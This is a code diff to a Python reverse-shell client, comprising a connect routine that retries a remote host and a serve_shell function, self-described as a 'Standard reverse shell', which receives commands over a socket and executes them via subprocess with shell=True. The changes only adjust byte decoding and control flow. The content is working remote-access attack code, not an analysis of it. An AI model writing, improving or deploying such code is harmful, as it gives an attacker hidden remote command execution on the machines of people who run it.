@@ -47,20 +47,20 @@ def connect(host, port, enc=False):
         except:
             time.sleep(10)
 
-            
+
 
 def serve_shell(s):
     """Recieve commands from remote server and run on local machine"""
 
     # Standard reverse shell
     while True:
-        data = s.recv(1024).decode("utf-8")
-        if data[:2] == 'cd':
-            os.chdir(data[3:].strip())
-        elif data[:4].strip() == 'kill':
+        data = s.recv(1024)
+        if data[:2].decode("utf-8") == 'cd':
+            os.chdir(data[3:].decode("utf-8").strip())
+        elif data[:4].decode("utf-8").strip() == 'kill':
             break
-        elif len(data) > 0:
-            cmd = subprocess.Popen(data[:], shell=True,
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
 
